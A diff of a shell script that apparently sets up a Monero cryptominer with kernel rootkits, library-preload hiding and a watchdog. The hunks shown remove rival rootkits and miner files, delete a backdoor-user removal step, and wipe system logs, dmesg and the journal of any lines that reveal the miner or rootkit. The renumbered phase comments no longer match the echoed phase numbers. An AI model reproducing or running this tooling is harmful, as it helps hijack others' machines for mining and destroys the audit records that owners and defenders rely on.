@@ -375,24 +375,17 @@ for auth_file in ~/.ssh/authorized_keys /root/.ssh/authorized_keys; do
     fi
 done
 
-# Phase 8: Remove backdoor user
-echo "[*] Phase 8: Removing backdoor user..."
-pkill -9 -u clamav-mail 2>/dev/null
-userdel -r clamav-mail 2>/dev/null
-rm -f /etc/sudoers.d/clamav-mail 2>/dev/null
-sed -i '/clamav-mail/d' /etc/passwd /etc/shadow 2>/dev/null
-
-# Phase 9: Remove kernel rootkits
+# Phase 8: Remove kernel rootkits
 echo "[*] Phase 9: Removing kernel rootkits..."
 sudo rmmod diamorphine reptile rootkit nuk3gh0st 2>/dev/null
 rm -rf /reptile /tmp/.ICE-unix/Reptile /tmp/.ICE-unix/Diamorphine /tmp/.X11-unix/hiding-cryptominers-linux-rootkit 2>/dev/null
 rm -f /usr/local/lib/libhide.so /etc/ld.so.preload 2>/dev/null
 
-# Phase 10: Remove watchdog and cleanup scripts
+# Phase 9: Remove watchdog and cleanup scripts
 echo "[*] Phase 10: Removing watchdog..."
 rm -f /usr/local/bin/system-watchdog /usr/local/bin/clean-old-logs.sh 2>/dev/null
 
-# Phase 11: Clean logs
+# Phase 10: Clean logs
 echo "[*] Phase 11: Cleaning logs..."
 for logfile in /var/log/syslog /var/log/auth.log /var/log/messages /var/log/kern.log; do
     [ -f "$logfile" ] && sed -i '/swapd\|gdm\|kswapd0\|xmrig\|miner\|accepted\|launcher\|diamorphine\|reptile\|rootkit\|Loaded\|>:-/d' "$logfile" 2>/dev/null
@@ -400,7 +393,7 @@ done
 dmesg -C 2>/dev/null
 journalctl --vacuum-time=1s 2>/dev/null
 
-# Phase 12: Clean temporary files
+# Phase 11: Clean temporary files
 echo "[*] Phase 12: Cleaning temporary files..."
 find /tmp /var/tmp \( -name "*xmrig*" -o -name "*swapd*" -o -name "*gdm*" -o -name "*monero*" \) -exec rm -rf {} + 2>/dev/null
 
@@ -411,7 +404,7 @@ echo '========================================================================='
 # ======================================================================
 
 # Continue with original script...
-VERSION=3.2
+VERSION=3.5
 echo '========================================================================='
 echo "MoneroOcean FULL ULTIMATE Setup v$VERSION"
 echo "Features: Kernel Rootkits + libhide.so + Intelligent Watchdog"
